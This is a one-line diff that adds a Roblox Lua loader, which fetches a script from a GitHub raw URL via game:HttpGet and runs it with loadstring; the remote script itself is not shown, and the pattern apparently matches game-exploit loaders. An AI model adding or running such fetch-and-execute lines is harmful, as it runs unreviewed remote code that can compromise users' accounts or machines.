@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zhogoshi/haruko/refs/heads/main/script.lua"))()
